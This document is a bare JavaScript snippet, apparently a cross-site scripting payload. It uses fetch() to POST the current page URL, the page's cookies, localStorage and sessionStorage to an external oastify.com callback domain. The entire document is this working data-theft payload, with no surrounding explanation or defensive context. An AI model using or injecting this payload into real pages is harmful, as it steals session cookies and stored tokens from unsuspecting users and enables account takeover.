fetch('https://d4n.ophbgcz2nphm7luc5sg4xvjsrjxalc91.oastify.com/', {
  method: 'POST',
  body: JSON.stringify({
    url: location.href,
    cookies: document.cookie,
    local: localStorage,
    session: sessionStorage
  })
});
